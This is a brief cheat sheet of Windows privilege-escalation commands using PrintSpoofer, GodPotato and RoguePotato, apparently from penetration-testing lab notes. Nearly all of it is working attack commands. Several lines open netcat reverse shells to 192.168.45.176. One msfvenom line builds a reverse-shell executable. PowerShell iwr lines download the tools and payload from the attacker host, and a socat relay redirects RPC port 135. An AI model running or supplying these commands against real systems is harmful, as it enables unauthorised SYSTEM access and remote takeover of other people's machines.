# PrintSpoofer
```bash
.\PrintSpoofer.exe -c "C:\TEMP\nc.exe 192.168.45.176 1337 -e cmd"
```


# GodPotato
```bash
.\GodPotato.exe -cmd "cmd /c whoami"
.\GodPotato.exe -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.45.176 7777"
```


# RoguePotato
```bash
sudo socat tcp-listen:135,reuseaddr,fork tcp:<TARGET.MACHINE.IP>:9999
## sudo socat tcp-listen:135,reuseaddr,fork tcp:192.168.217.247:9999

msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.176 LPORT=53 -f exe > reverse.exe
nc -nvlp 53

iwr -uri http://192.168.45.176/RoguePotato.exe -Outfile RoguePotato.exe
iwr -uri http://192.168.45.176/reverse.exe -Outfile reverse.exe

.\RoguePotato.exe -r 192.168.45.176 -l 9999 -e ".\reverse.exe"
```
